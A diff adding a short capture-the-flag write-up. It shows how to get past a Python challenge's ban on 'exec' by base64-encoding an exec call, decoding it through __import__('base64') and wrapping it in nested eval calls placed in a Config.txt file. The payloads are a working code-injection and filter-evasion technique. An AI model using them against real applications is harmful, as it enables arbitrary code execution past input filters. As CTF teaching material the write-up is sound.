@@ -1,0 +1,47 @@
+This Is The Part That I Think Its Really Challenging And Fun :)
+
+In This Part We Can Not Easily Use exec Function Or Anything That Contains exec.
+We Can Do An Encoding Trick And Use exec ! Simply, We Can Convert Previous Challenge Code
+ To Base64 After That Tries To Decode It. After That We Can Execute Whatever We Want !
+
+For Example Code That We Want To Run Is : 
+
+```
+# You Can Write Any Code That You Want In Here But Its Challenge Answer Now
+exec("username='pwnninja';password='s3cr3t'")
+```
+
+
+Now Simply We Convert This To base64. This Will Be base64 Of The Code :
+
+```
+ZXhlYygidXNlcm5hbWU9J3B3bm5pbmphJztwYXNzd29yZD0nczNjcjN0JyIp
+```
+
+There Is One Other Thing That You Can Not import libraries in eval function, Then
+How You Can Decode This base64 ? Simply There Is '__import__("module_name")' Is Here To
+Help You !
+
+Our Plan Is To Import base64 Library And Decode This base64 That Contains exec Function. After That
+We Execute base64 Decoded String !
+
+We Should Add This Code To Config.txt File :
+
+```
+__import__('base64').b64decode('ZXhlYygidXNlcm5hbWU9J3B3bm5pbmphJztwYXNzd29yZD0nczNjcjN0JyIp')
+```
+
+If You Add This Code To Config.txt File Still You Can Not Win, Why ?
+Because After Executing This Just We Deocde base64 But We Can Not Still Execute It !
+Then Just We Should Add Another eval To Make Everything Work. In Fact We Decode base64 Once
+With Our Eval Function After That exec Function Appears That We Can Execute !
+
+```
+eval("__import__('base64').b64decode('ZXhlYygidXNlcm5hbWU9J3B3bm5pbmphJztwYXNzd29yZD0nczNjcjN0JyIp')")
+```
+
+Again We Lose :/ Why ? Really I dont Know But I Added One Other eval And It Worked XD
+
+```
+eval(eval("__import__('base64').b64decode('ZXhlYygidXNlcm5hbWU9J3B3bm5pbmphJztwYXNzd29yZD0nczNjcjN0JyIp')"))
+```
